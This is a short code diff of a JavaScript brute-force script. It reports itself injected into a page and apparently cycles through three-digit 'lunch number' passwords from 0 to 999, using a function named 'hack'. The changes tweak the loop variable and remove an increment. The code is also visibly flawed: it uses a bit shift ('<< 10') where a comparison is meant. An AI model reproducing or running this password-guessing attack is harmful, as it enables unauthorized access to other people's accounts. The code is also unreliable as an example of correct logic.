@@ -28,7 +28,7 @@ console.log('Script injection confirmed.');
 var haspassword = false;
 var numbertry = 0;
 var numbertrytostr = null;
-for (let numbertry = 0; numbertry <= 999; numbertry++) {
+for (var numbertry = 0; numbertry <= 999; numbertry++) {
 	function timeoutfunc() {
 		console.info("delay");
 		setInterval( function() {
@@ -41,7 +41,6 @@ for (let numbertry = 0; numbertry <= 999; numbertry++) {
 
 	function hack(numbertryarg) {
 		//adds one to variable, then uses those digits for the password. the if statements add extra zeroes for lunch numbers where the first three digits are under 100.
-		numbertryarg = numbertryarg + 1;
 		if (numbertryarg >= 1 && numbertryarg << 10) {
 			numbertrytostr = '00' + String(numbertryarg);
 			//Adds two zeroes to numbers like 1, making it 001.
